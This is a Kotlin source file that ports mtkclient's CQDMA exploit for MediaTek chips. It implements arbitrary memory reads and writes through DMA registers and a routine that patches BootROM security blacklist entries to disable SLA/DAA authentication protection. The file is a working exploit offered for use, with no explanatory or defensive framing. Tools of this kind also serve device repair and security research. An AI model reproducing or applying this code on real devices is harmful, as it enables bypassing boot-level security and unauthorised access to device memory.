package com.example.protocol

import com.example.model.LogLevel
import java.nio.ByteBuffer
import java.nio.ByteOrder

/**
 * CQDMA Exploit and Direct Memory Access Controller ported from mtkclient cqdma.py
 */
class MtkCqdmaEngine(
    private val read32Func: (Long) -> Long,
    private val write32Func: (Long, Long) -> Boolean,
    private val logCallback: (String, LogLevel) -> Unit
) {
    companion object {
        const val CQDMA_INT_FLAG = 0x0L
        const val CQDMA_INT_EN = 0x4L
        const val CQDMA_EN = 0x8L
        const val CQDMA_RESET = 0xCL
        const val CQDMA_FLUSH = 0x14L
        const val CQDMA_SRC = 0x1CL
        const val CQDMA_DST = 0x20L
        const val CQDMA_LEN1 = 0x24L
        const val CQDMA_LEN2 = 0x28L
        const val CQDMA_SRC2 = 0x60L
        const val CQDMA_DST2 = 0x64L
    }

    /**
     * Reads memory via CQDMA DMA controller
     */
    fun cqread32(cqdmaBase: Long, apDmaMem: Long, addr: Long, dwords: Int): ByteArray {
        val outBytes = ByteArray(dwords * 4)
        val buffer = ByteBuffer.wrap(outBytes).order(ByteOrder.LITTLE_ENDIAN)

        for (i in 0 until dwords) {
            val srcAddr = addr + (i * 4)
            write32Func(cqdmaBase + CQDMA_SRC, srcAddr)
            write32Func(cqdmaBase + CQDMA_DST, apDmaMem)
            write32Func(cqdmaBase + CQDMA_LEN1, 4L)
            write32Func(cqdmaBase + CQDMA_EN, 1L)

            // Polling until CQDMA_EN & 1 == 0
            var retry = 0
            while (retry < 50) {
                val enVal = read32Func(cqdmaBase + CQDMA_EN)
                if ((enVal and 1L) == 0L) {
                    break
                }
                retry++
            }

            val readVal = read32Func(apDmaMem)
            buffer.putInt(readVal.toInt())
        }

        return outBytes
    }

    /**
     * Writes memory via CQDMA DMA controller
     */
    fun cqwrite32(cqdmaBase: Long, apDmaMem: Long, addr: Long, values: LongArray): Boolean {
        for (i in values.indices) {
            val targetVal = values[i]
            write32Func(apDmaMem, targetVal)
            write32Func(cqdmaBase + CQDMA_SRC, apDmaMem)
            write32Func(cqdmaBase + CQDMA_DST, addr + (i * 4))
            write32Func(cqdmaBase + CQDMA_LEN1, 4L)
            write32Func(cqdmaBase + CQDMA_EN, 1L)

            var retry = 0
            while (retry < 50) {
                val enVal = read32Func(cqdmaBase + CQDMA_EN)
                if ((enVal and 1L) == 0L) {
                    break
                }
                retry++
            }

            write32Func(apDmaMem, 0xCAFEBABE)
        }
        return true
    }

    /**
     * Disables BootROM memory access security blacklist entries using CQDMA DMA registers
     */
    fun disableRangeBlacklist(config: ChipConfig): Boolean {
        val cqdmaBase = config.cqdmaBase
        val apDmaMem = config.apDmaMem
        val blacklist = config.blacklist

        if (cqdmaBase == null || apDmaMem == null) {
            logCallback("Chipset ${config.name} does not require CQDMA DMA controller (Hardware direct access)", LogLevel.INFO)
            return true
        }

        if (blacklist.isEmpty()) {
            logCallback("No security blacklist entries specified for ${config.name}.", LogLevel.INFO)
            return true
        }

        logCallback("Disabling BootROM range security checks (${blacklist.size} entries)...", LogLevel.INFO)
        for ((idx, entry) in blacklist.withIndex()) {
            logCallback(" -> Patching blacklist entry #$idx at 0x%08X with 0x%08X...".format(entry.address, entry.value), LogLevel.INFO)
            val success = cqwrite32(cqdmaBase, apDmaMem, entry.address, longArrayOf(entry.value))
            if (!success) {
                logCallback("[-] Failed to patch security register at 0x%08X".format(entry.address), LogLevel.WARNING)
                return false
            }
        }

        logCallback("[+] BootROM Security Blacklist successfully disabled! SLA/DAA Protection unlocked.", LogLevel.SUCCESS)
        return true
    }
}
